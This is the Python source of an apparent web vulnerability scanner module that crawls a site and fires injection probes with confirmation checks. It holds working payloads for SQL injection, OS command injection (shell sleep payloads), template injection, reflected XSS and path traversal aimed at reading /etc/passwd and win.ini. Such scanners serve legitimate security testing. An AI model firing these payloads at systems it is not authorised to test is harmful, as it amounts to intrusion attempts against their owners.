"""Web — active injection testing with two-step confirmation.

Crawls the target, collects injectable parameters (query strings + HTML forms)
and probes each with a battery of techniques. Every technique has a single,
explainable oracle, and every hit is *confirmed a second way* before it's
reported — so a finding is evidence, not a guess:

  * Reflected XSS         a marker with raw <, >, " reflects unencoded.
  * SQLi (error-based)    a single quote raises a DB error; a balanced quote
                          clears it — proving the quote was the cause.
  * SQLi (boolean blind)  a TRUE condition returns the normal page while a
                          FALSE one diverges, across two injection contexts.
  * SQLi (time blind)     a SLEEP/pg_sleep/WAITFOR payload delays the response;
                          confirmed by a *second*, longer sleep — the measured
                          delay must track the time we asked for.
  * Command injection     a `; sleep N` payload delays the response (same time-
                          correlation proof) — server-side command execution.
  * SSTI                  {{a*b}} comes back evaluated (the product, not the
                          expression), confirmed with a second random product.
  * Path traversal / LFI  ../../etc/passwd returns a `root:x:0:0:` signature
                          absent from the baseline.
  * Open redirect         a redirect-style param lands in the Location header.

Run with -v/--verbose to watch each payload, its oracle measurement and the
confirmation step live.
"""

from __future__ import annotations

import asyncio
import html
import random
import re
import string
import time
from urllib.parse import quote, urlencode, urlsplit

from wraith.core import web
from wraith.core.http import fetch
from wraith.core.models import Severity
from wraith.core.phase import Phase, register

# --------------------------------------------------------------- signatures
_SQL_ERRORS = re.compile(
    r"(you have an error in your sql syntax|warning: mysqli?_|mysql_fetch|"
    r"valid mysql result|MySqlException|com\.mysql\.jdbc|"
    r"ORA-\d{5}|quoted string not properly terminated|"
    r"PostgreSQL.*ERROR|pg_query\(\)|syntax error at or near|"
    r"org\.postgresql\.util\.PSQLException|Npgsql\.|psycopg2\.|"
    r"SQLite3?::|sqlite3.OperationalError|"
    r"Microsoft OLE DB Provider|Unclosed quotation mark|SQLSTATE\[|"
    r"Incorrect syntax near|Conversion failed when converting|"
    r"System\.Data\.SqlClient\.SqlException|System\.Data\.OleDb|"
    r"Microsoft SQL (?:Server|Native)|\[SQL Server\]|ODBC SQL Server Driver|"
    r"SQLServerException|com\.microsoft\.sqlserver|"
    r"java\.sql\.SQLException|org\.hibernate)",
    re.I,
)
_PASSWD = re.compile(r"root:.*?:0:0:")                       # /etc/passwd first line
_WININI = re.compile(r"\[(?:fonts|extensions|mci|files)\]", re.I)  # windows win.ini sections

REDIRECT_PARAMS = {
    "url", "next", "redirect", "redirect_url", "redirecturl", "return", "returnurl",
    "return_url", "dest", "destination", "continue", "r", "u", "go", "to", "target",
    "link", "out", "view", "image_url",
}

# --------------------------------------------------------------- payloads
# Time-based. {s} = seconds to sleep; the leading 1'/1 closes a likely string
# or numeric context before the injected delay.
_SQLI_TIME = [
    ("sqli/MySQL",      "1' AND SLEEP({s})-- -"),
    ("sqli/MySQL-num",  "1 AND SLEEP({s})-- -"),
    ("sqli/PostgreSQL", "1';SELECT pg_sleep({s})-- -"),
    ("sqli/MSSQL",      "1';WAITFOR DELAY '0:0:{s}'-- -"),
]
_CMDI_TIME = [
    ("cmdi/shell-;",   "1; sleep {s} "),
    ("cmdi/shell-|",   "1| sleep {s} "),
    ("cmdi/subshell",  "1$(sleep {s})"),
    ("cmdi/backtick",  "1`sleep {s}`"),
]
# Boolean-blind: (TRUE, FALSE) pairs. Each pair differs by a single character so
# a reflected echo cancels in the core and only the query's truth value shows.
# OR-pairs flip row *presence* even when the base value matches nothing (a login
# / username check); AND-pairs flip it when the base value is itself a matching
# row (a product/article id). Both run, in string, numeric and double-quote
# contexts — the one that fits the query wins.
_SQLI_BOOL = [
    ("1' OR '1'='1",  "1' OR '1'='2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1 OR 1=1",      "1 OR 1=2"),
    ("1 AND 1=1",     "1 AND 1=2"),
    ('1" OR "1"="1',  '1" OR "1"="2'),
    ('1" AND "1"="1', '1" AND "1"="2'),
]
# Parameters that are framework plumbing or anti-CSRF tokens, never the vuln —
# testing them just burns requests (ASP.NET __VIEWSTATE alone is huge).
_SKIP_PARAMS = {
    "__viewstate", "__viewstategenerator", "__eventvalidation", "__eventtarget",
    "__eventargument", "__viewstateencrypted", "__requestverificationtoken",
    "csrfmiddlewaretoken", "authenticity_token", "csrf_token", "csrftoken",
    "_csrf", "__csrf", "_token",
}


def _skip_param(name: str) -> bool:
    n = (name or "").lower()
    return n in _SKIP_PARAMS or n.startswith("__")


# Path traversal / LFI: (payload, label). All checked against the signatures.
_LFI_PAYLOADS = [
    ("../../../../../../../../etc/passwd",          "unix /etc/passwd"),
    ("....//....//....//....//....//etc/passwd",     "unix (dot-dot filter bypass)"),
    ("..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",  "unix (url-encoded)"),
    ("..\\..\\..\\..\\..\\..\\windows\\win.ini",     "windows win.ini"),
]


# ------------------------------------------------------- oracles (pure, tested)
def _sim(a, b) -> float:
    """Similarity of two response bodies (0..1), capped for speed."""
    import difflib
    return difflib.SequenceMatcher(None, (a or "")[:4000], (b or "")[:4000]).ratio()


def _echo_strip(body: str, *values) -> str:
    """Remove the reflected payload (raw, HTML-escaped and URL-encoded) from a
    body before comparing it.

    A page that echoes the parameter back (a search box, a form that re-renders
    your input, an error that quotes it) would otherwise look "different" just
    because the payloads differ — which is reflection, not a SQL reaction. The
    echo is usually HTML-escaped (`'` → `&#x27;`), so the raw string alone won't
    catch it. Stripping every form leaves only the part of the page the *query*
    changed, so the comparison measures the vulnerability and not the input."""
    out = body or ""
    for v in values:
        if not v:
            continue
        for form in (v, html.escape(v), html.escape(v, quote=True), quote(v)):
            out = out.replace(form, "")
    return out


def _core(a: str, b: str):
    """The differing middles of two strings — common prefix and suffix removed."""
    i, n = 0, min(len(a), len(b))
    while i < n and a[i] == b[i]:
        i += 1
    j = 0
    while j < n - i and a[-1 - j] == b[-1 - j]:
        j += 1
    return a[i:len(a) - j], b[i:len(b) - j]


def core_sim(a: str, b: str) -> float:
    """Similarity of just the reacting cores of two bodies (common chrome
    stripped). A tiny tell in a big page is as visible as a big one, so the
    measure doesn't drown as the surrounding page grows — the fix that lets a
    boolean oracle see a one-line verdict flip inside kilobytes of layout."""
    ca, cb = _core(a or "", b or "")
    if not ca and not cb:
        return 1.0
    return _sim(ca, cb)


def _margin(noise: float, k: float = 3.0, floor: float = 0.02) -> float:
    """How far below the page's own noise a reaction has to fall to count.

    `noise` is how similar two identical requests are to each other — a static
    page is ~1.0, a dynamic one lower. The gate scales with the slack the page
    naturally has: a calm page reacts at the slightest divergence, a noisy one
    only to a big one. This is the per-target calibration that fixed-threshold
    oracles lack (a 0.91 break is real on a calm page, noise on a busy one)."""
    return max(floor, k * (1.0 - noise))


def relative_break(noise: float, broke_sim: float, restore_sims) -> bool:
    """SQLi without an error string, calibrated to the target: an odd quote
    diverges from the baseline *further than the page's own noise* while a valid
    SQL continuation (`1''`, `1 AND 1=1`, `1-- -`) restores it to roughly the
    baseline. Comparing against the page's measured noise — not a fixed 0.9 —
    is what catches a small-but-real break in a big chrome page."""
    if noise <= 0:
        return False                       # no stable baseline to compare against
    gate = noise - _margin(noise)
    if broke_sim >= gate:
        return False                       # the quote didn't break anything real
    return any(s >= gate for s in restore_sims)


def boolean_blind_hit(noise_core: float, tf_core_sim: float) -> bool:
    """TRUE and FALSE differ in their reacting core beyond the page's own
    core-level noise — the injected truth value changed the response.

    The TRUE/FALSE payloads are chosen to differ by a single character (`=1` vs
    `=2`), so a reflected echo cancels and only the *query's* effect survives in
    the core. A non-injectable parameter returns identical cores (similarity 1.0)
    and never fires; a real boolean oracle drops far below the gate whether the
    tell is a one-word verdict or a whole table of rows."""
    if tf_core_sim is None:
        return False
    gate = min(0.9, noise_core - 0.02)
    return tf_core_sim < gate


def looks_like_sql_error(text: str) -> bool:
    return bool(_SQL_ERRORS.search(text or ""))


def lfi_signature(text: str) -> str | None:
    """Name of the system file leaked in the response, or None."""
    if _PASSWD.search(text or ""):
        return "/etc/passwd"
    if _WININI.search(text or ""):
        return "windows/win.ini"
    return None


def ssti_payloads(a: int, b: int) -> list[tuple[str, str]]:
    """Render `a*b` in several template syntaxes. The engine that evaluates it
    returns the product; an engine that merely reflects echoes the expression."""
    e = f"{a}*{b}"
    return [
        ("Jinja2/Twig",      "{{%s}}" % e),
        ("Smarty/FreeMarker", "${%s}" % e),
        ("ERB",              "<%%= %s %%>" % e),
        ("Razor/Thymeleaf",  "#{%s}" % e),
    ]


def ssti_evaluated(text: str, product: int, payload: str) -> bool:
    """The product survives once the reflected payload is stripped -> a template
    engine computed it, rather than the page merely echoing the expression back.

    Apps commonly re-render the submitted value in a form field, so the raw
    expression (`43*41`) is present in the response *even when it was also
    evaluated* — the old `expr not in text` guard then rejected a real hit (the
    Cipher level is exactly this). Removing the echoed payload first (raw,
    HTML-escaped, URL-encoded — the same reflection-cancelling strip the boolean
    oracle uses) leaves only what the engine produced; a random 4-digit product
    surviving there can't be reflection."""
    return str(product) in _echo_strip(text or "", payload)


def timing_hit(base_t: float, elapsed: float, slept: float, frac: float = 0.6) -> bool:
    """The response took at least a good fraction of the sleep longer than normal."""
    return elapsed - base_t >= slept * frac


def timing_confirms(base_t: float, e1: float, s1: float, e2: float, s2: float) -> bool:
    """Both probes delayed AND the longer sleep delayed proportionally more —
    the response time tracks the injected sleep, ruling out random network lag."""
    return (timing_hit(base_t, e1, s1) and timing_hit(base_t, e2, s2)
            and (e2 - base_t) > (e1 - base_t) + 0.5 * (s2 - s1))


def timing_too_noisy(samples, max_spread: float = 2.0, max_slow: float = 4.0) -> bool:
    """A target whose benign response time swings wildly (or is just slow) can't
    be timed reliably — an injected sleep is indistinguishable from random lag,
    so time-based tests there only invent false positives."""
    if not samples:
        return True
    return (max(samples) - min(samples)) > max_spread or max(samples) > max_slow


@register
class InjectionPhase(Phase):
    name = "injection"
    requires = frozenset({"http-probe"})
    description = "XSS, SQLi (error/boolean/time), command injection, SSTI, LFI, open redirect."

    MAX_PAGES = 60
    MAX_POINTS = 80
    POINT_CONCURRENCY = 16  # parameters tested in parallel (overlaps remote latency)
    REQ_TIMEOUT = 6.0       # per-probe timeout — a stalled request fails fast, not the queue
    TIMING_POINTS = 16      # time-based probes are slow; cap how many points get them
    SLEEP_FAST = 3          # initial time-based probe
    SLEEP_CONFIRM = 6       # confirmation sleep — must delay proportionally more

    async def run(self, ws, console) -> None:
        self._console = console          # so _send can log HTTP at -v 2/3
        for base in self._bases(ws):
            host = urlsplit(base).netloc
            seeds = [base + "/"] + [e.url for e in ws.endpoints if e.url.startswith(base)]
            console.trace(f"crawling {base} for injectable parameters (up to {self.MAX_PAGES} pages)…",
                          level=1)
            pages = await web.crawl(
                seeds, host, fetch, self.MAX_PAGES, timeout=self.REQ_TIMEOUT,
                on_fetch=lambda u, n, t: console.trace(f"crawl [{n}/{t}] → GET {u}", level=2),
            )
            console.trace(f"crawl done: {len(pages)} page(s)", level=1)

            points, seen = [], set()
            for url, resp in pages.items():
                for pt in web.build_points(url, resp.text):
                    if _skip_param(pt.param):
                        continue          # framework / anti-CSRF plumbing, never the vuln
                    key = (pt.method, pt.action, pt.param, pt.location)
                    if key not in seen:
                        seen.add(key)
                        points.append(pt)
            # Test the likeliest data parameters first, and let them — not a wall
            # of submit/flag form fields — claim the capped budgets (MAX_POINTS,
            # and especially the slow time-based subset).
            points.sort(key=self._point_priority)
            points = points[: self.MAX_POINTS]
            if not points:
                console.warn(f"{base}: no injectable parameters found")
                continue

            console.info(f"{base}: testing {len(points)} parameter(s)")
            total = len(points)
            sqli_flagged: set = set()

            # Pass 1 — the cheap tests, run concurrently so request latency
            # overlaps. Sequential against a remote target is painfully slow.
            sem = asyncio.Semaphore(self.POINT_CONCURRENCY)
            counter = [0]

            async def cheap(pt):
                async with sem:
                    counter[0] += 1
                    console.trace(f"[{counter[0]}/{total}] {pt.method} {pt.action} [{pt.param}]", level=1)
                    hit = await self._test_sqli_error(ws, console, pt)
                    if not hit:            # already proven in-band — no need to also blind-test
                        hit = await self._test_sqli_boolean(ws, console, pt)
                    await self._test_ssti(ws, console, pt)
                    await self._test_lfi(ws, console, pt)
                    await self._test_xss(ws, console, pt)
                    if pt.param.lower() in REDIRECT_PARAMS and pt.location == "query":
                        await self._test_open_redirect(ws, console, pt)
                    if hit:
                        sqli_flagged.add(id(pt))

            await asyncio.gather(*(cheap(pt) for pt in points))

            # Pass 2 — time-based, sequential on a bounded subset so the timing
            # measurement isn't muddied by other requests running in parallel.
            # Skipped entirely on a high-jitter target: timing oracles can't tell
            # an injected sleep from random server lag there, so they'd be both
            # unreliable (false positives) and slow.
            timing = points[: self.TIMING_POINTS]
            if timing and await self._timing_reliable(console, timing[0]):
                console.trace(f"time-based pass on {len(timing)} parameter(s)", level=1)
                for pt in timing:
                    await self._test_time_based(ws, console, pt, skip_sql=(id(pt) in sqli_flagged))

    # ----------------------------------------------------------- transport
    _console = None

    async def _send(self, pt, value, timeout=None):
        timeout = timeout or self.REQ_TIMEOUT
        values = dict(pt.values)
        values[pt.param] = value
        if self._console is not None:
            self._console.trace(f"→ {pt.method} {pt.action}  [{pt.param}={value!r}]", level=2)
        if pt.location == "query":
            r = await fetch(f"{pt.action}?{urlencode(values)}", method="GET",
                            allow_redirects=False, timeout=timeout)
        else:
            r = await fetch(pt.action, method="POST", data=values,
                            allow_redirects=False, timeout=timeout)
        if self._console is not None and r is not None:
            self._console.trace(f"← {r.status}  {len(r.text)} bytes", level=3)
        return r

    async def _timed_send(self, pt, value, timeout):
        t0 = time.monotonic()
        r = await self._send(pt, value, timeout=timeout)
        return r, time.monotonic() - t0

    # ------------------------------------------------------------------ XSS
    async def _test_xss(self, ws, console, pt) -> bool:
        probe = "wx" + "".join(random.choice(string.ascii_lowercase) for _ in range(6))
        payload = f'{probe}"><svg/onload=alert(1)>'
        r = await self._send(pt, payload)
        hit = bool(r and payload in r.text)
        console.trace(f"xss        marker reflected raw={hit}", level=2)
        if hit:
            self._report(ws, console, "Reflected XSS", Severity.HIGH, pt, payload,
                         "Input is reflected without output encoding, allowing script injection.")
        return hit

    # --------------------------------------------------- SQLi in-band (quote)
    async def _test_sqli_error(self, ws, console, pt) -> bool:
        # One probe set, two oracles: a quote that errors (string leak) and a
        # quote that *breaks the response* (app swallows the error, returns blank).
        # Two identical baselines measure the page's own noise, so the break test
        # is calibrated to this target instead of a fixed threshold.
        base = await self._send(pt, "1")
        base2 = await self._send(pt, "1")
        broken = await self._send(pt, "1'")
        if not (base and base2 and broken):
            return False
        if looks_like_sql_error(base.text):
            return False                   # baseline already errors — can't tell
        bclean = _echo_strip(base.text, "1")
        noise = _sim(bclean, _echo_strip(base2.text, "1"))
        broke_sim = _sim(_echo_strip(broken.text, "1'"), bclean)
        broke = relative_break(noise, broke_sim, [noise])  # provisional (no restores yet)
        console.trace(f"sqli/quote broken_err={looks_like_sql_error(broken.text)} "
                      f"noise={noise:.3f} sim(broken,base)={broke_sim:.3f} broke={broke}", level=2)

        # (a) error-based: a single quote raises a DB error a balanced one clears.
        #     Try several "valid" continuations — `1''` is balanced in a string
        #     context but still errors in a numeric one, so a single fixed clearer
        #     would miss numeric injection.
        if looks_like_sql_error(broken.text):
            for clear in ("1''", "1-- -", "1 AND 1=1"):
                balanced = await self._send(pt, clear)
                if balanced and not looks_like_sql_error(balanced.text):
                    self._report(ws, console, "SQL Injection (error-based)", Severity.HIGH, pt, "1'",
                                 "A single quote raised a database error that a valid continuation "
                                 f"({clear!r}) clears — the query is built from unsanitised input.")
                    return True

        # (b) breakage-based: the odd quote breaks the response; a valid SQL
        #     continuation restores it — SQLi even when no error text leaks.
        #     The continuations are SQL-*distinctive* on purpose: `1 AND 1=1` is
        #     valid in both numeric (`id=1 AND 1=1`) and string (`'1 AND 1=1'`)
        #     context, and `1-- -` comments the rest of the query away. A balanced
        #     `1''` is deliberately *not* used here — a shell command (`ping … 1''`
        #     collapses `''` to nothing) or any fragile non-SQL parser restores on
        #     it too, which is exactly what made an OS-command-injection point
        #     (deadwood's back-door) double-report as blind SQLi. Requiring a
        #     SQL-only continuation to restore keeps the real SQLi and drops that.
        if broke:
            restore_sims = []
            for payload in ("1 AND 1=1", "1-- -"):   # SQL-distinctive, numeric + string
                r = await self._send(pt, payload)
                restore_sims.append(_sim(_echo_strip(r.text if r else "", payload), bclean))
                if restore_sims[-1] >= noise - _margin(noise):
                    break                  # one restore is enough
            if relative_break(noise, broke_sim, restore_sims):
                console.trace("sqli/quote broke and a valid continuation restored — CONFIRMED", level=2)
                self._report(ws, console, "SQL Injection (blind — broken response)", Severity.HIGH, pt, "1'",
                             "A single quote breaks the response while a valid SQL continuation "
                             "restores it: the input alters SQL syntax, but the error is suppressed.")
                return True
        return False

    # ----------------------------------------------------- SQLi boolean-blind
    async def _test_sqli_boolean(self, ws, console, pt) -> bool:
        bval = pt.values.get(pt.param) or "1"
        benign = await self._send(pt, bval)
        benign2 = await self._send(pt, bval)
        if benign is None or benign2 is None or not (200 <= benign.status < 300):
            return False
        # Two identical baselines give the page's own core-level noise, so the
        # gate is calibrated to this target (a dynamic core needs a bigger signal).
        noise_core = core_sim(_echo_strip(benign.text, bval), _echo_strip(benign2.text, bval))
        # Try every quoting context (string, numeric, double-quote) as a probe —
        # the right one for the query matters (a string `1 OR 1=1` is inert inside
        # quotes, a numeric `1' OR ...` just errors).
        for true_v, false_v in _SQLI_BOOL:
            rt = await self._send(pt, true_v)
            rf = await self._send(pt, false_v)
            if not (rt and rf):
                continue
            tf = core_sim(_echo_strip(rt.text, true_v), _echo_strip(rf.text, false_v))
            console.trace(f"sqli/bool [{true_v!r}] noise_core={noise_core:.3f} "
                          f"true~false(core)={tf:.3f}", level=2)
            if not boolean_blind_hit(noise_core, tf):
                continue
            # Confirm the same divergence reproduces (guards a one-off content blip).
            ct = await self._send(pt, true_v)
            cf = await self._send(pt, false_v)
            if ct and cf and boolean_blind_hit(
                noise_core, core_sim(_echo_strip(ct.text, true_v), _echo_strip(cf.text, false_v)),
            ):
                console.trace("confirm sqli/bool reproduced — CONFIRMED", level=2)
                self._report(ws, console, "SQL Injection (boolean blind)", Severity.HIGH, pt,
                             f"{true_v}  /  {false_v}",
                             "A TRUE condition returns the normal page while a FALSE one diverges "
                             "(reproduced) — the query's logic reacts to injected input.")
                return True
            console.trace("confirm sqli/bool did not reproduce — discarded", level=2)
        return False

    # ------------------------------------------------------------ time-based
    async def _test_time_based(self, ws, console, pt, skip_sql=False) -> bool:
        base_t = await self._baseline_time(pt)
        console.trace(f"timing baseline {base_t:.2f}s", level=2)
        families = ([] if skip_sql else list(_SQLI_TIME)) + list(_CMDI_TIME)

        # Fire the whole family at once with a short sleep, then confirm the one
        # that bites — keeps the slow part to ~one sleep of wall-time per param.
        probes = await asyncio.gather(*[
            self._timed_send(pt, tmpl.format(s=self.SLEEP_FAST), timeout=self.SLEEP_FAST + 8)
            for _, tmpl in families
        ])
        candidate = None
        for (label, tmpl), (r, dt) in zip(families, probes):
            hit = r is not None and timing_hit(base_t, dt, self.SLEEP_FAST)
            console.trace(f"{label:<16} sleep({self.SLEEP_FAST}) → {dt:.2f}s  {'HIT' if hit else '·'}", level=2)
            if hit and candidate is None:
                candidate = (label, tmpl, dt)
        if candidate is None:
            return False

        label, tmpl, dt1 = candidate
        r2, dt2 = await self._timed_send(pt, tmpl.format(s=self.SLEEP_CONFIRM),
                                         timeout=self.SLEEP_CONFIRM + 8)
        ok = r2 is not None and timing_confirms(base_t, dt1, self.SLEEP_FAST, dt2, self.SLEEP_CONFIRM)
        console.trace(f"confirm {label} sleep({self.SLEEP_CONFIRM}) → {dt2:.2f}s  "
                      f"{'CONFIRMED' if ok else 'not correlated — discarded'}", level=2)
        if not ok:
            return False

        is_sql = label.startswith("sqli")
        kind = "SQL Injection (time-based blind)" if is_sql else "Command Injection"
        sev = Severity.HIGH if is_sql else Severity.CRITICAL
        proof = (f"baseline {base_t:.2f}s; sleep({self.SLEEP_FAST})→{dt1:.2f}s; "
                 f"sleep({self.SLEEP_CONFIRM})→{dt2:.2f}s — delay tracks the injected sleep")
        self._report(ws, console, kind, sev, pt, tmpl.format(s=self.SLEEP_FAST),
                     f"The response time scales with an injected sleep, proving server-side "
                     f"{'SQL' if is_sql else 'OS command'} execution. {proof}")
        return True

    async def _baseline_time(self, pt) -> float:
        benign = pt.values.get(pt.param) or "1"
        samples = []
        for _ in range(2):
            _, dt = await self._timed_send(pt, benign, timeout=10)
            samples.append(dt)
        return min(samples)  # min is the least noisy estimate of "normal"

    async def _timing_reliable(self, console, pt) -> bool:
        """Sample the target's benign latency; if it swings too much, timing
        oracles can't be trusted here, so skip the whole time-based pass."""
        benign = pt.values.get(pt.param) or "1"
        samples = []
        for _ in range(4):
            _, dt = await self._timed_send(pt, benign, timeout=self.REQ_TIMEOUT)
            samples.append(dt)
        noisy = timing_too_noisy(samples)
        console.trace(f"timing jitter min={min(samples):.2f}s max={max(samples):.2f}s "
                      f"spread={max(samples) - min(samples):.2f}s → {'too noisy' if noisy else 'ok'}",
                      level=1)
        if noisy:
            console.warn("target latency too noisy for reliable time-based tests — skipping them")
        return not noisy

    # ------------------------------------------------------------------ SSTI
    async def _test_ssti(self, ws, console, pt) -> bool:
        a, b = random.randint(41, 99), random.randint(41, 99)
        expr, product = f"{a}*{b}", a * b
        # Cheap pre-check: one polyglot covering the common syntaxes. The product
        # shows up only if *some* engine evaluated it (a random 4-digit product
        # won't collide by chance), so non-vulnerable params cost a single
        # request instead of one per template.
        poly = "${%s}${{%s}}#{%s}{{%s}}<%%=%s%%>" % (expr, expr, expr, expr, expr)
        pre = await self._send(pt, poly)
        if pre is None or str(product) not in pre.text:
            console.trace(f"ssti pre-check {expr} → no eval", level=2)
            return False
        # Something evaluated — find which engine and confirm with a fresh product.
        for engine, payload in ssti_payloads(a, b):
            r = await self._send(pt, payload)
            if r is None or not ssti_evaluated(r.text, product, payload):
                continue
            c, d = random.randint(41, 99), random.randint(41, 99)
            payload2 = payload.replace(expr, f"{c}*{d}")
            r2 = await self._send(pt, payload2)
            ok = r2 is not None and ssti_evaluated(r2.text, c * d, payload2)
            console.trace(f"ssti/{engine} eval={product} confirm={'CONFIRMED' if ok else 'discarded'}", level=2)
            if ok:
                self._report(ws, console, "Server-Side Template Injection", Severity.HIGH, pt, payload,
                             f"A template expression was evaluated server-side ({engine}: "
                             f"sent {expr}, got {product}) — frequently a path to RCE.")
                return True
        return False

    # ------------------------------------------------------------------- LFI
    async def _test_lfi(self, ws, console, pt) -> bool:
        baseline = await self._send(pt, pt.values.get(pt.param) or "x")
        base_sig = lfi_signature(baseline.text) if baseline else None
        for payload, label in _LFI_PAYLOADS:
            r = await self._send(pt, payload)
            if r is None:
                continue
            sig = lfi_signature(r.text)
            hit = sig is not None and sig != base_sig
            console.trace(f"lfi/{label:<28} {'READ ' + sig if hit else 'no'}", level=2)
            if not hit:
                continue
            # Confirm it reads again — a one-off match could be noise.
            r2 = await self._send(pt, payload)
            if r2 and lfi_signature(r2.text) == sig:
                console.trace(f"confirm lfi {sig} read twice CONFIRMED", level=2)
                self._report(ws, console, "Path Traversal / Local File Inclusion", Severity.HIGH,
                             pt, payload,
                             f"A traversal payload returned a {sig} signature absent from the "
                             "baseline — the parameter reads arbitrary files.")
                return True
        return False

    # -------------------------------------------------------- open redirect
    async def _test_open_redirect(self, ws, console, pt) -> bool:
        r = await self._send(pt, "https://wraith.example/")
        if r is None:
            return False
        location = r.headers.get("location", "")
        hit = r.status in (301, 302, 303, 307, 308) and "wraith.example" in location
        console.trace(f"open-redirect status={r.status} location={location!r} hit={hit}", level=2)
        if hit:
            self._report(ws, console, "Open Redirect", Severity.MEDIUM, pt, "https://wraith.example/",
                         "The redirect target is taken from user input without validation.")
        return hit

    # --------------------------------------------------------------- report
    def _report(self, ws, console, title, sev, pt, payload, desc) -> None:
        where = f"{pt.method} {pt.action} [{pt.param}]"
        console.finding(sev.label, f"{title}  {where}")
        ws.add_finding(title=f"{title} in '{pt.param}'", severity=sev, phase=self.name,
                       target=pt.action, evidence=f"{where} payload={payload!r}", description=desc)

    # -------------------------------------------------------------- helpers
    # Form fields that submit an answer/flag rather than feed a query — real on a
    # CTF or a contact form, but the last thing worth a slow timing probe.
    _LOW_VALUE_PARAMS = frozenset({"flag", "answer", "submit", "captcha", "honeypot"})

    @classmethod
    def _point_priority(cls, pt):
        """Sort key (lower = tested first): cheap GET query params before form
        bodies, narrow forms before wide ones, and obvious submit/flag fields
        last — so the capped budgets land on real data parameters."""
        low = 1 if pt.param.lower() in cls._LOW_VALUE_PARAMS else 0
        loc = 0 if pt.location == "query" else 1
        return (low, loc, len(pt.values))

    @staticmethod
    def _bases(ws) -> list:
        seen, out = set(), []
        for e in ws.endpoints:
            p = urlsplit(e.url)
            base = f"{p.scheme}://{p.netloc}"
            if base not in seen:
                seen.add(base)
                out.append(base)
        return out
